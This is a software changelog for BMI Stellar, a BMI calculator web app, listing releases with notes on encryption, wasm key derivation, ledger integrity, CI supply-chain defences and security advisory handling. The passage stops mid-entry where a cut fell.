# Changelog

All notable changes to **BMI Stellar** are documented in this file.

The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) principles, adapted to the project's `feat / fix / chore / docs / refactor / style` commit conventions. Versions are synchronized from `package.json` via `scripts/dev/version-to.sh`: every bump records the bare version in the `## [Released]` ledger (newest first, the zelynic shape) and splices the release section into the Released area, right after the ledger - pre-filled from the migrated Unreleased bullets when they exist, otherwise from the commit history since the previous reachable tag. `## [Unreleased]` sits at the bottom of the file and starts fresh after every release. Release tags follow `v<major>.<minor>.<patch>` (a `-<suffix>` marks a pre-release) and match `package.json` exactly.

For the full architectural context behind any release, see [`docs/furthermore.md`](docs/furthermore.md). For dormant-maintenance guidance, see [`DORMANT.md`](DORMANT.md).

---

## [Released]

v80.5.4
v80.5.3
v80.5.2
v80.5.2-night.1
v80.5.1
v80.5.0
v80.3.0
v80.3.0-night.1
v80.2.0
v80.1.0
v80.0.7
v80.0.6
v80.0.5
v80.0.4
v80.0.3
v80.0.2
v80.0.1
v80.0.0
v80.0.0-night.2
v80.0.0-night.1

## [80.5.4]

### Changed

- **Internal research: night-depth-cleanup-1B-1 - the runtime-claim registry re-truthed** _(978adb1)_
- **Internal research: the interleaving census verdict and the proof-tier LTS boundary** _(d11ddc5)_
- **Internal research: night-netrunner-Z2 - the docs sync for the proof tier** _(3cbac67)_
- **Internal research: night-netrunner-Z2 - the proof lane and the census guard** _(0a53b02)_
- **Internal research: night-netrunner-Z2 - the for-all proof tier over the named laws** _(39087df)_

### Chore

- **maintenance deps weekly** _(4994235)_

## [80.5.3]

### Changed

- **normalize CHANGELOG.md whitespace to satisfy format:check (CI #695)** _(4529329)_

## [80.5.2]

### Changed

- **Internal research: read the zip manifest gate from raw entry names, not columns** _(ec4b3d7)_
- **Internal research: read the release key from the repository secret with a variable fallback** _(1cde012)_
- **** _(gpg: Signature made Mon 23 Nov 2026 08:46:59 PM WIB)_
- **** _(gpg: using EDDSA key 2B52187D2AB618A7591D45C9C7F8B07418899C4E)_
- **** _(gpg: Good signature from "rezky_nightky (oxyzenQ) <oxyzenQ@proton.me>" [ultimate])_
- **** _(gpg: aka "Rezky Cahya Sahputra (cosmic dragon) <130107241+oxyzenQ@users.noreply.github.com>" [ultimate])_
- **release v80.5.2-night.1 test ci release** _(f42ee26)_
- **Internal research: bump the attestation action pin to the current release** _(7d636a9)_
- **Internal research: document the D3 publisher layer, the artifact gate, and the signed release channel** _(6eb9c2c)_
- **Internal research: bind the release channel to a signed tag and OIDC attestations** _(5abdbd1)_
- **Internal research: fix the lint failures the CI lane caught** _(ca9b107)_
- **Internal research: gate the built bundle with an artifact-level provenance check** _(9c28752)_
- **Internal research: bind the depth matrix to the publisher with an Ed25519 D3 layer** _(87af298)_
- **Internal research: add D3 signing and a reference verifier to the provenance generator** _(6325e2f)_
- **Internal research: keep the owner identity out of the client bundle** _(5e33324)_
- **Internal research: sync release docs with the self-verifying zip and three-digest contract** _(251a500)_
- **Internal research: add BLAKE3 and SHAKE256 release checksum sidecars** _(76a659a)_
- **Internal research: ship a self-verifying source zip in the release pipeline** _(9a1ad28)_

## [80.5.2-night.1]

### Changed

- **Internal research: bump the attestation action pin to the current release** _(7d636a9)_
- **Internal research: document the D3 publisher layer, the artifact gate, and the signed release channel** _(6eb9c2c)_
- **Internal research: bind the release channel to a signed tag and OIDC attestations** _(5abdbd1)_
- **Internal research: fix the lint failures the CI lane caught** _(ca9b107)_
- **Internal research: gate the built bundle with an artifact-level provenance check** _(9c28752)_
- **Internal research: bind the depth matrix to the publisher with an Ed25519 D3 layer** _(87af298)_
- **Internal research: add D3 signing and a reference verifier to the provenance generator** _(6325e2f)_
- **Internal research: keep the owner identity out of the client bundle** _(5e33324)_
- **Internal research: sync release docs with the self-verifying zip and three-digest contract** _(251a500)_
- **Internal research: add BLAKE3 and SHAKE256 release checksum sidecars** _(76a659a)_
- **Internal research: ship a self-verifying source zip in the release pipeline** _(9a1ad28)_

## [80.5.1]

### Added

- **The AXP1-ZnQ supply-chain defense verdict engine (night-solid-defense-1).** The raw audit gates answer "is something dangerous in the tree?"; AXP1-ZnQ answers the question the owner actually wakes up for: "can the robot fix it, or is this mine to decide?" `scripts/gates/axp1-znq.ts` replays the exact remediation the maintenance lane runs (a maximal `bun update --lockfile-only` inside an isolated scratch tree), re-audits the refreshed scratch lock against the same advisory DB, and classifies every dangerous advisory by remediability: cleared by the replay = UPDATE-SOON (exit 0 with loud warnings - one compatible refresh away), surviving the replay = CALL-OWNER (exit 1 - no fixed release inside the pinned ranges, an override bump or major upgrade is an owner decision), absent before the replay but present after = CALL-OWNER (the arrayref regression class: the compatible refresh itself pulled a vulnerable release), stale allowlist entry or unknown severity = the same fail-closed law `audit-deps.ts` enforces. Verdicts land in the console, GitHub annotations, and the run summary. The engine proves its contract on fixtures with a frozen clock (`bun run audit:axp1-znq --selftest`, nine scenarios, no network) before the network gets a vote, and the lane (`.github/workflows/axp1-znq.yml`) chains off the weekly maintenance completion plus manual dispatch.

### Changed

- **The server-side actions self-heal lane is retired (the zelynic-aligned final form).** `.github/workflows/self-heal-actions.yml` (Sunday 03:00 UTC + manual dispatch, `PAT_WORKFLOW` push credential) is deleted whole: a standing Workflows-write PAT is exactly the secret the estate refuses to carry, and its expiry turned the Sunday lane into a standing red (run #52 - the preflight PAT probe proved HTTP 401 against the stored token). The one automatic seat moves where the estate already works: the pre-commit gate's `check-actions-pins.sh` advisory verdict re-reads pin freshness on every commit - silent when current (the skip), a named heal command when a pin is behind - and `scripts/ci/actions-version-sweep.sh --apply` performs the heal on demand; the healed pins commit like any other change and the push rides the committer's own credentials. No standing secret, no schedule, no server-side push. Docs synced (README, DORMANT, INNOVATIONS, furthermore, Maintenance Policy).

- **The runtime-probe lane is retired, and with it the last standing push credential.** `.github/workflows/runtime-probe.yml` (Sunday 03:00 UTC + manual dispatch) probed future Node majors and pushed the prepared bump with `PAT_WORKFLOW` - the estate's last consumer of that secret. Deleted whole, it takes the credential dependency with it: every remaining automation rides `GITHUB_TOKEN` or the committer's own credentials, and proactive future-Node-major watching is the accepted price of carrying no standing secret. Runtime-behavior coverage language in the README now points at the runtime proof harness (`scripts/proof/`, sixteen fail-closed claims in a pinned browser).

## [80.5.0]

### Added

- **The DNA helix loading face (night-ux-orion-2).** A silent large-data load (the Argon2id encrypt/decrypt behind an export, the staged restore of ten thousand records) is indistinguishable from a hang, so the app gains its one loading face: the reference estate's counter-phase braille strand table, byte for byte (`src/lib/utils/dna-helix.ts`) - two strands running the same ten-frame sweep in opposite directions, the request out and the answer back, written out as literals so the table is the pin. The pure core also carries the lazy slot clock (an operation inside the 100 ms threshold never draws, so fast paths never flash the indicator) and the wrapped frame lookup. The face (`DnaHelix.svelte`) stays thin glue on purpose: one 25 ms poll slice, one dirty text node, the rendered frame a pure function of elapsed time so a late poll repeats a frame instead of skipping one. The functional-indicator law (loading indicators always animate, even under prefers-reduced-motion - iOS enables that setting by default) holds by construction: the face is slot-driven text, not CSS animation, so no reduced-motion rule can freeze it. Zero new dependencies. The batteries pin the table's construction law (ten frames, two cells each, the strands never collide, width stable), the clock's threshold boundaries, the deterministic repeat-never-skip walk, the wrap after the tenth frame, the broken-clock silence, the face against a controlled clock (first frame exactly at the threshold, the leak-free teardown), and both real lanes' surfaces against real timers (a closed overlay mounts nothing, an open one shows only legal frames from the table, one node per seat).

### Changed

- **Every large-data load claims the helix seat (night-ux-orion-2, the one-loading-face law).** The staging overlay drops its static gear icon for the helix face (a frozen-looking frame is the exact hang the lane exists to prevent), the crypto modal's loading lane drops the retired indeterminate progress bar for the same face, and the form's duplicated overlay markup collapses onto the shared `StagingSpinner` component, so all the loading sites narrate through one component with one dirty node. `src/styles/animation.css` sheds the rules the retirement orphans (the `bmi-progress` bar family and the staging gear) and its spin-keyframe comment now names what actually still spins. No public API changed: `StagingSpinner` keeps its `show`/`label` props, and the page, About, and form call sites keep their shape.

## [80.3.0]

### Changed

- **The living-docs master cleaning (night-depth-cleanup-2).** A full sweep of every living doc (archive audits and the changelog ledger excluded) verified each factual claim against its source of truth and fixed the sixteen stale ones: the tightened KDF read-side caps now read 256 MiB / t 8 / p 4 everywhere outside the deliberate historical note (INNOVATIONS §31 and furthermore had both drifted to the old 1 GiB / t 64 ceiling), the runtime-proof claim set reads sixteen (P1–P16, seal custody included) instead of the pre-Z8 eight/15-of-15, SECURITY.md names the wasm engine as the primary derivation seat with noble as the fallback instead of "no WASM", the check-all/verify gate descriptions match `scripts/build.sh` exactly (nine audits, no false step-for-step claim), Node's engines range reads 22–26, the Vercel runtime reads nodejs26.x, the PWA smoke-test section names are the real ones (Welcome…Info), the logo derivative list carries all eight sizes, and the CSS cascade list carries all eighteen files. The six substantial cross-doc duplications were measured: the drifted KDF block collapsed to a pointer into INNOVATIONS §31; the other five survive as distinct-purpose summaries (tables, constructions, argumentation) and are recorded as intentional. Zero commented-out code and zero placeholder residue found in source and living docs — both verified at peak, nothing to clean.

## [80.3.0-night.1]

### Added

- **The never-be charter (the identity contract).** README and `docs/INNOVATIONS.md` now carry the negative boundaries the product will never cross — daemon, sound, game, account, server, data collection, medical device, cloud inference, app-store binary, ads, unverifiable dependency — each denial grounded in an invariant the codebase already enforces, from the zero-knowledge chain to the night-supply-1 policy. The charter bounds the innovation ledger itself: a proposal that crosses a line is not a feature request, it is a different product, and changing the charter is the heaviest decision this repository admits.

- **The Burn Bounds (night-depth-hardening-5).** Two attacker-controlled inputs could degrade the app forever without failing once. The envelope KDF read-side caps tighten 1 GiB / t 64 / p 8 → 256 MiB / t 8 / p 4 (the app's highest written rung is 64 MiB / t 3 / p 1, so the caps keep a 4x headroom while bounding a hostile derivation to seconds instead of an OOM burn), and the import record cap `MAX_IMPORT_RECORDS = 10,000` refuses before any integrity work (the ledger's save floor is O(N) sync hashes; one uncapped hostile file was a durable per-save tax). Both battery-pinned (`kdf-ladder.test.ts` caps assertion, the new `history-io-caps.test.ts`), both mapped through `importErrorKey` and the four locales. The same pass verified the deterministic surfaces at peak — pure IEEE arithmetic in the metrics core, no iteration-order dependence in the Rust engine, the wasm artifact pinned by toolchain + lockfile + digest — and the full audit rides as `docs/AUDIT-DEPTH-2026-11.md`.

- **The depth audit (night-zen-lts-Z, the five-area perstage pass).** `docs/AUDIT-DEPTH-2026-11.md` records the whole round with skip-and-justify for every peak domain: the sharpest-skill surfaces read by hand (`bmi-calculator.ts`, `ledger-chain.ts`, `lib.rs` in full), three breadth sweeps (infra, hygiene, security boundary), verified non-findings (prototype pollution unreachable, IV hygiene, origin gates, supply-chain posture), and the owner decision queue (the observation-only audit posture, the degraded-encryption indicator, the SvelteKit 3.x upgrade, the first scheduled firing to watch).

- **The structural supply-chain policy (night-supply-1, the arrayref incident class).** A compromised maintainer account republished a popular crate to depend on a build-script payload crate, and the malicious versions rode semver-compatible resolutions for 86–107 minutes. The fences now in place: the engine's direct dependency is exact-pinned (`=0.6.0`, a republished semver-compatible version can never resolve into the build), `engine/argon2id/deny.toml` denies git sources, unknown registries, duplicate versions, wildcards, and yanked crates, `cargo deny check bans sources` blocks every push and every swept lane behind a digest-pinned scanner (`scripts/ci/install-cargo-deny.sh` — the tarball SHA-256 is a committed constant verified on every run, double-checked against upstream at pin time), the wasm artifact carries a 45,000-byte ceiling so injected code cannot drift past the refresh flow silently, and the JavaScript surface sits under `scripts/gates/check-supply-chain.ts` (registry-only ranges, empty lifecycle-script trust, no unpinned runtime fetches, well-formed recorded checksums, policy-erosion refusal) — which caught and closed the one real unpinned-fetch hole the tree had on its first run. Cargo still never executes in a job that holds write permission.

- **The Rust engine maintenance lane (night-frontier-Z6, the zelynic Dragon Guard port).** The one Rust seat in the tree (`engine/argon2id`) now rides the maintenance discipline its sibling project zelynic runs for its whole Rust estate: a weekly Cargo sweep with a dependency-only diff and a staged bot commit (`scripts/ci/sweep-rust-workspaces.sh`), formatting and strict clippy on every push beside the wasm provenance digest, the wasm artifact parity gate that fails a sweep it cannot prove (the embedded artifact's one writer stays the deliberate `wasm-provenance.sh --refresh` flow), weekly cargo-audit over the engine lockfile (pinned scanner, `--deny warnings`, observation-only), and a three-surface version-sync gate (`scripts/gates/check-rust-version-sync.sh`, gate-keepers section 13) tying `rust-toolchain.toml`, the Cargo.toml MSRV, and the maintenance workflow to one toolchain version. The engine stays primary: the worker tries the wasm engine first and falls back to byte-identical JS only on failure — pinned by the existing worker battery, untouched by this lane.

- **The Single-Writer Law (night-frontier-Z5).** Every serialization primitive the ledger had was per-realm — two tabs of the same app raced the same origin storage, and a stale cross-tab read-modify-write could silently drop a foreign record and freeze the continuity witness as a false accusation. Every legit ledger write (save, import commit, restore, clear) now holds the origin-wide Web Lock (`bmi-ledger-write`) as one critical section: freshness refresh, validated read, merge, mirror write, and the witness reseat/seal drain. `storage-coherence.ts` closes the stale-cache door: foreign-tab storage events drop health-key cache entries, and every locked section refreshes from the mirror first — sealed mirrors re-open into an unlocked realm's cache, locked realms keep locked-read semantics. Clear also drops the same-realm cache entry, fixing a pre-Z5 false-freeze after clear-then-save. The tamper freeze rule stays untouched (the lock is advisory; out-of-band writers still freeze), engines without the Web Locks API degrade to per-realm serialization reported honestly, and the save's signature return stays synchronous so the caller's dedupe contract is unchanged.

- **Bounded shell re-verification window (night-frontier-Z10).** The precache integrity gate verified only on the update path, so a poisoned entry could serve until the next update — potentially weeks. One precache entry is now re-digested per navigation event, round-robin, with the activate sweep's delete/heal semantics verbatim (`verifyNextIntegrityEntry`): the whole precache is re-verified every N navigations (N = manifest size), amortized to one match plus one SHA-256 per navigation — the per-fetch digest law stays intact. The required second half is the reseat law carried into the shell: the navigation shells the worker itself caches re-seat their manifest digests at the moment of the write (`noteShellWrite`), so a legit write can never false-heal on a later sweep and a runtime note never arms a pre-Z7 cache. The PWA offline-shell gate audits the SW wiring statically (the SW cannot run in vitest); the battery pins the cycle, the bounded poison detection, the healed digest, and the honest degrades.

- **Unlocked-rotation continuity (night-frontier-Z9).** A passphrase rotation in an already-unlocked session re-seals the ledger instead of tombstoning it: `ledger-rotation.ts` holds one ledger-lock section that verifies the current ledger under the OLD witness key (`witnessRotationVerdict` — the reseat law verbatim, mode-aware, the Z7 vault veto included), captures the plaintext of every health key the unlocked refresh already opened, swaps the seats, re-seals the values under the NEW seat, and re-anchors the witness under the NEW key. The old route's two costs are gone: the blind window between the rotation and the next legit save (the one moment tampering could happen unobserved) and the rotation lockout (old sealed values permanent-opaque under the new key). A frozen verdict never re-anchors — the freeze rule is untouched, the witness stays as evidence — while the values still re-seal, because persistence is not blessing; the audit reads that state witness-opaque, never violated. A rotation while locked keeps the honest tombstone route byte-identical.

- **Typed tombstones (night-frontier-Z9).** A seal failure and a deliberate wipe both wrote the empty string, so the honest edge Z7 named (a seal-failure tombstone plus an in-place edit) read identically to a removed witness. A seal failure now writes the typed marker (`{"t":"seal-failed"}`) while a deliberate tombstone stays the empty string; the continuity audit carries `sealDegraded` next to `unanchored`, and the vault-veto warning names which state it sees. Fail-closed by construction: the marker is no witness to any consumer, pre-Z9 data keeps the exact behavior, compat is free, and the marker never blocks recovery.

- **The engine-custodied session seal (night-frontier-Z8).** The last "documented physics, not solved" line of the custody arc moves: the at-rest session seal key installs into an AES-256-GCM keystore slot inside the wasm engine (`engine_seal_put` / `engine_seal_seal` / `engine_seal_open`, the RustCrypto `aes-gcm` stack exact-pinned at `=0.10.3`, no_std, no allocator, no RNG), every seal and open runs in-engine in the standard GCM construction (the WebCrypto layout — ciphertext plus the 16-byte tag — so the `bmi-at-rest-v1` envelope is byte-identical no matter which side sealed it), the seat kinds refuse cross-use both ways (the witness key can never be an AES key and the seal key can never sign), the plaintext region is zeroized on seal, the output region is zeroized on an auth-failure refusal, and the lock wipe is the engine's volatile zeroization with the self-reported all-zero proof. The raw session material is consumed exactly once on every path (engine stage zeroized, `importAesKey` wipes the WebCrypto fallback). Proven: the NIST GCM test case 13 vector through the real ABI, a WebCrypto parity matrix across a generation boundary, bidirectional envelope interop, failure parity on flipped bits, the provable wipe, the full-keystore honest degrade, and the live P16 runtime claim (one engine-band wasm instantiation plus the v1 envelope law with an independently recomputed checksum). The artifact grew 48.983 KB to 67.447 KB and the provenance ceiling moved 50000 to 72000 as a deliberate, reviewable edit (the profile keeps opt-level 3 so the benched Argon2id speedup is not traded for size). ABI version 2; no envelope change, no UI change, no new flags.

- **Cross-tab ledger incoherence (the Z5 race).** Two tabs saving concurrently could lose a record and leave the witness frozen as a false `violated` accusation — with no tampering anywhere. The two-realm battery proves the union survives, the witness blesses every legit write, and the freeze still fires for out-of-band writers.

### Fixed

- **The guardian lanes and the dragon hunt (night-zen-lts-Z1).** The two 15-minute CI jobs obey the repo's own ten-minute law again (measured ~2 minutes, so the ceiling holds with margin), security-audit's Rust toolchain pins 1.100.0 instead of the floating `@stable` its own comment forbids, and build.sh interpolates the bun pin from `package.json` instead of a hardcoded string that drifts. The dragon hunt landed: one `bytesToHex` leaf replaces seven hand-rolled copies, the duplicated import pre-guard merges into `importPlaintextOrFail` (a corrupted encrypted payload now answers `corrupted_file` on the validate path too), one locale-safe `formatShareTimestamp` serves the text share and the card forge, and the dead code is gone — 3 test-only hooks with zero callers, 5 unneeded exports, 1 stale eslint-disable, and 28 dead translation keys × 4 locales (verified zero-reference, no dynamic key construction). Every ratchet moved DOWN: history-io.ts 760→751, ja.ts 676→640, zh.ts 631→601.

- **The CodeQL alert sweep on main (nine open alerts, eight closed, one root-caused).** The vault flush worker took messages unverified while its two siblings (the service worker and the KDF worker) gate by origin — it now drops any message whose origin disagrees with the worker's own origin, unread, before the snapshot string is touched. Seven unused test imports and locals across six batteries are deleted (dead code, verified by a whole-suite reference scan, not by eye). The last finding — the storage-event dispatch helper — survives a two-round investigation: an inline suppression comment shipped first and empirically did not close the alert, so the construct was reproduced against the exact 2.27.4 bundle with a minimal repro, which showed the analyzer resolves the modern `new StorageEvent(type, initDict)` to a parameterless ambient constructor (MessageEvent resolves fine; StorageEvent does not) and does not honor the suppression query. The helper now builds the event through the spec's own legacy construction route (`document.createEvent('StorageEvent')` + `initStorageEvent`), analyzer-clean in the repro, jsdom-parity-proven listener-identical to the constructor route, and pinned by this battery end-to-end — the query stays active for the whole tree, nothing is excluded or dismissed.

- **The keystore refusal collision (night-frontier-Z8).** A keystore refusal returned the `ERR_KEYSLOT` error code as the put's return value, and `4` collides with a valid gen-0 handle shape (slot 3, generation 0) — a caller reading the value as an opaque handle could receive a seat that can never work. Both `engine_keystore_put` and the new `engine_seal_put` now honor the documented contract — 0 on every refusal, mirroring `engine_alloc` — and a full keystore degrades honestly to the byte-identical WebCrypto fallback seat instead. The engine battery caught it; an engine-level regression test pins the contract.

## [80.2.0]

### Added

- **The OPFS flush() vault tier (B1, night-frontier-Z4).** `durability: 'strict'` is a hint; `FileSystemSyncAccessHandle.flush()` is the fsync-shaped primitive. The latest rolling backup snapshot now mirrors into the origin's private file system (`vault-backup.json`) through a worker — truncate, write, flush, close, single-flight, fire-and-forget — as the second durable home behind the IndexedDB rotation. When the rotation is empty or unreadable, the restore path falls back to the flushed copy, allowlist still enforced. The storage-inventory law moved in the same commit: the P3 runtime claim now enumerates the OPFS root beside the localStorage keys and the IndexedDB stores.

- **The Device-Tier Argon2id Ladder (B2, night-frontier-Z4).** The derivation rung adapts to the device through the existing capability engine — high 64 MiB / t3, medium 32 MiB / t3, low 19 MiB / t2 — with the OWASP Argon2id floor clamped under every rung and read-side caps refusing absurd parameters fail-closed. The finding that makes tier variance safe: the envelope's `kdfParams` was always recorded but never used — decrypt now honors the envelope's recorded rung (a vault sealed on a low-end phone opens on a desktop and vice versa), and the at-rest session anchors on the stored verifier's rung so a tier change between sessions never re-derives a different key from the sealed ledger. Pre-ladder envelopes decrypt with the fixed legacy defaults they were written with.

### Security

- Runtime proof harness extended from 13 to 15 fail-closed claims: the OPFS vault tier (the flushed file byte-equivalent to the latest IndexedDB snapshot) and the KDF ladder (the production envelope's rung at or above the OWASP floor, pinned to a real ladder value). Two consecutive local runs PROVEN 15/15 on the production build in the pinned browser.

## [80.1.0]

### Added

- **The Ledger Continuity Chain (S1, night-frontier-Z3).** A SHA-256 hash chain over the validated records, with the chain head sealed in the IndexedDB meta store as the continuity witness. AES-GCM protects per-value and the HMAC signature protects per-file; the chain now protects the sequence - truncation, replay, foreign insertion, and content edits of the device history are detectable, and a save that observes a pre-state which does not match the witness freezes the witness instead of silently re-anchoring tampered content. The export envelope moves to v4: the chain head rides the user's own encrypted backup, so a backup taken earlier witnesses later tampering (zero cloud witness). The legacy v0-v3 ladder stays importable; backups carry the witness so a restore never falsely accuses.

### Fixed

- **The at-rest session start moment (A1, night-frontier-Z3).** `enableEncryption()` had no caller in any UI flow, so the verifier never existed and innovation 25's seal never activated live - real code, real tests, dead wire. The first passphrase-proven import (a successful decrypt of the user's own valid ledger file) now establishes the verifier on a device without one; a device with a verifier keeps the innovation-25 guarantee unchanged.
- **The unlock import raced the purge guard.** The fire-and-forget at-rest registration lost the race against the import's ledger write on a locked device, so the write was refused and the unlock modal deadlocked on save_failed. The import path now awaits the verifier-anchored unlock (a 30 s bounded budget) before its write.
- **The production CSP denied WebAssembly.** `script-src` carried no `wasm-unsafe-eval` token, so the KDF worker's Rust engine (night-enhance-1) was refused by its own fail-closed digest gate and every derivation fell back to the slower pure-JS engine. Both CSP variants now carry the narrow token; the wasm engine is live in production.

### Security

- Runtime proof harness extended from 8 to 13 fail-closed claims: the at-rest seal live (P7), the purge guard (P8), locked-read semantics with the unlock restoring readability (P9), the continuity witness riding real saves (P10), and the witness freeze on a device tamper (P11). Two consecutive local runs PROVEN 13/13 on the production build in the pinned browser.

## [80.0.7]

### Fixed

- **New picomatch ReDoS advisory accepted per the audit policy.** The
  dependency audit gate went red on GHSA-fc5q-39xc-vjpf (high, ReDoS
  through single-branch repeated extglobs, vulnerable through 4.0.7):
  no fixed picomatch 4.x release exists yet - the latest published
  4.0.7 is still inside the range - and both dependents
  (`@rollup/pluginutils`, `@vercel/nft`) pin `^4.0.2`, so the advisory
  is accepted in `scripts/audit-allowlist.json` with the
  build-time-only scope as the reason (vite/rollup plugin matching and
  the Vercel adapter's file tracing, never shipped to the runtime
  bundle) and the 2027-05-01 expiry, to be replaced by an override bump
  the moment a fixed release lands.

## [80.0.6]

### Changed

- **Node 26 is the shipped runtime end to end.** CI (`NODE_VERSION: 26`),
  the CodeQL and security-audit lanes, and the Vercel deployment
  (`VERCEL_NODE_RUNTIME: nodejs26.x`) all moved off Node 24 in this
  release window, so every lane builds and tests on the runtime the app
  actually ships on. _(1fef790)_

- **The engines range and every runtime surface agree on Node 26
  (night-zen-lts-a).** The runtime upgrade landed on Nov 15 while four
  surfaces still declared the old `>=22 <25` range, so the repo
  contradicted itself about its own runtime: `package.json` engines now
  reads `>=22 <27`, the build.sh doctor range check and both verdict
  messages accept 22-26 (a Node 26 host - the CI runtime itself - no
  longer fails its own environment diagnostics), the DORMANT.md wake-up
  capsule states the new range, and the furthermore.md build-environment
  bullet is rewritten from its stale Node 24 claim. _(e669bad)_

- **The runner fleet pins ubuntu-26.04 ahead of the label drift
  (night-zen-runner-1, night-zen-runner-2).** All 11 jobs across the
  nine workflows moved from `ubuntu-24.04` to `ubuntu-26.04` (GA since
  the 2026-09-17 changelog) while the `ubuntu-latest` label migrates
  from 24.04 between Oct 19 and Nov 19, 2026 - riding the new LTS by
  pin instead of inheriting label drift, with every push-triggered lane
  proven on the new image (full check-all, CodeQL, Docs, the wholesale
  gate-keepers suite). The wholesale gate caught a real tool-table lag
  in the process: even the latest actionlint release (1.7.12, Mar 2026)
  still enumerates ubuntu-24.04 as the newest Ubuntu label, so
  `.github/actionlint.yaml` registers `ubuntu-26.04` through the
  documented self-hosted-runner escape hatch - the exact remedy the
  [runner-label] finding suggests, harmless once a future actionlint
  knows the label natively. _(7b8fc98, 1f2ac8a)_

- **Every scheduled CI lane consolidated on the Sunday 10:00 WIB
  guardian anchor.** Dependency maintenance, the actions self-heal,
  CodeQL, and the runtime probe now fire at the shared Sunday 03:00 UTC
  (10:00 WIB) anchor; the security audit keeps its deliberate 30-minute
  offset (Sunday 10:30 WIB / 03:30 UTC) so it still audits the bun.lock
  refresh that maintenance commits minutes after the anchor, preserving
  the documented audit-after-refresh ordering instead of reintroducing
  the pre-refresh checkout race it was staggered against. The schedule
  references in DORMANT.md and the LTS audit doc follow. _(1392128)_

### Fixed

- **The storage-repair path survives blocked localStorage
  (night-zen-lts-b).** `validateAndRepairCache()` read the localStorage
  repair source with a bare `localStorage.getItem(key)`; in private
  modes where the API is blocked the call throws, the exception escaped
  past the per-key repair logic, and `initStorage()` aborted its
  post-population phase even though the IndexedDB cache was already
  live. The read is wrapped in the try/catch idiom the rest of the
  module uses: no repair source means no repair, never a lost
  initialization. _(85e3fc6)_

- **Backup restore is restricted to the storage key registry
  (night-zen-lts-c).** `restoreLatestBackup()` replayed every key in
  the IndexedDB snapshot into `storageSet`, so a same-origin compromise
  that reshaped the backups store could inject arbitrary keys into the
  storage layer through the restore path. The replay now filters
  against `Object.values(STORAGE_KEYS)`: only keys the app owns can be
  restored, unknown keys are skipped, and the validated read paths
  still gate the restored values themselves. _(fe5b6c2)_

- **Release tag names pass through env, never into shell source
  (night-zen-lts-d).** Tag names are attacker-influenced input - git
  refname rules allow quotes, dollars, semicolons, parentheses and
  backticks - and interpolating `steps.tag.outputs.TAG_NAME` into a
  `run:` script lets a crafted ref inject bash syntax ahead of the
  format validators. The validate, changelog and both archive steps now
  consume the tag through `env:` mappings (action-input usages such as
  `tag_name:` and `files:` stay as expressions, which are data, not
  shell); zero tag interpolations remain in `run:` sources. _(a69f21c)_

- **A functional test localStorage under Node 26.** The CI lane failed
  with 64 `Cannot read properties of undefined (reading 'clear')`
  errors from the `localStorage.clear()` calls in test hooks: Node 26
  GA ships a native webstorage binding with an undefined value until
  `--localstorage-file` is provided, and jsdom's install no longer
  applied the way it did on Node 24. The test setup now provisions a
  real per-worker localStorage file, and the full 523-test suite runs
  green on the Node 26 runner. _(f201b7c)_

- **Four SvelteKit advisories remediated per the audit policy.** The
  dependency audit gate went red against the pinned 2.70.2 lockfile:
  `@sveltejs/kit` moves to 2.70.4 (latest 2.x), clearing
  GHSA-mw6w-2fmv-pvw3 and GHSA-rqp5-r3wg-vg35, both fixed in 2.70.4;
  GHSA-3r8g-jcqq-3p5j (high) and GHSA-6cf5-gc4q-fm3x (moderate) are
  patched only in 3.1.1 and affect the experimental remote-functions
  surface this app does not enable, so both are accepted in
  `scripts/audit-allowlist.json` with those reasons and the 2027-05-01
  expiry the other SvelteKit major-upgrade entries carry. _(12aa7d6)_

- **Every stale asset-path and signature-scope reference synced to the
  authoritative state (night-depth-cleanup-1).** The signature-assets
  policy doc and the BLAKE3 manifest are the source of truth (scope:
  `assets/`, `static/assets/`, `static/images/` - 18 signed entries;
  master plate at `assets/bmi-original-logo-2026.png`), yet
  `check-signature-assets.sh` still scanned the nonexistent
  `docs/assets/` and `assets/tools.md` claimed the wallpaper set sits
  outside the signature scope while the manifest signs all four
  wallpaper images. Both ends now mirror the manifest, including the
  example b3sum command. _(e83081a)_

### Chore

- Weekly dependency lockfile refresh, validated before commit with a
  read-only token. _(234cd19)_

## [80.0.5]

### Removed

- **Dead direct `esbuild` dependency (night-total-hardening-1).** The
  runtime `dependencies` block declared `esbuild`, but nothing in the
  tree ever imports it: `vite.config.ts` passes the option
  `minify: 'esbuild'` — a Vite option key — and Vite carries its own
  transitive esbuild. The direct entry forced a production-grade
  install of a package that is never used and widened the advisory
  surface. The `overrides.esbuild` pin stays: it still locks the
  transitive copy Vite resolves. Every other declared dependency was
  verified in use (fonts via CSS `@import`, `jsdom` as the vitest
  environment, `autoprefixer` via the postcss pipeline,
  `prettier-plugin-svelte` via `.prettierrc`, and the CLI tools through
  package scripts).

### Fixed

- **Consistent Signature and Depth-matrix rows on the About page
  (night-cafe-1).** The two fingerprint info-row icons now match their
  sibling rows: compact fixed 20px sizing with `flex-shrink: 0` (the
  long Depth-matrix row could squeeze its icon below size), brand
  purple for both icons instead of the inherited muted gray, and the
  Depth-matrix row renders its compact body exactly once — the
  duplicated `Depth-matrix:` label is stripped, the layer list is
  shortened to `layers=d0,d1,d2`, and the row wraps safely on narrow
  viewports. The contractual `depthLine` in `signature.ts` is
  untouched: tests, the signature gate, and the `-V` surface keep the
  full canonical format.

- **Trackable value for the golden-ratio constant
  (night-codeql-conv-1).** CodeQL flagged js/implicit-operand-conversion
  on the provenance mixer three times, across three different
  spellings of the same two expressions (`& mask`, an
  explicit `BigInt(...)` wrap, then a `BigInt.asUintN(64, ...)` wrap).
  The real cause, found by running the exact CI query bundle locally:
  CodeQL's literal analysis parses literals as floats, cannot parse an
  n-suffixed hex literal such as `0x9e3779b97f4a7c15n`, and therefore
  reads the `SIG_GOLDEN` constant as `undefined` — every arithmetic or
  bitwise use of it then reports an implicit conversion
  ("undefined to number or string" / "undefined to number"). The
  constant is now initialized as `BigInt("0x9e3779b97f4a7c15")`, which
  the value model tracks; the runtime value is identical. The mixer
  itself returns to the generator's exact `(x) & SIG_MASK64` spelling,
  so the code mirrors `generate-provenance-words.py` line for line
  again. Proof: the CI-identical query (codeql-bundle-v2.27.4) now
  reports zero results on a database of the whole repo; the signature
  gate reports status=verified across all 7 recorded surfaces; the
  full suite passes (523 tests, 35 files). The two earlier attempts
  (`BigInt(...)` and `BigInt.asUintN(64, ...)` wraps) did not address
  the cause and are superseded by this fix.

## [80.0.4]

## [80.0.3]

## [80.0.2]

## [80.0.1]

## [80.0.0]

## [80.0.0-night.2]

## [80.0.0-night.1]

### Added

- **A GitHub repository row on the About page (about-repo-row).** The
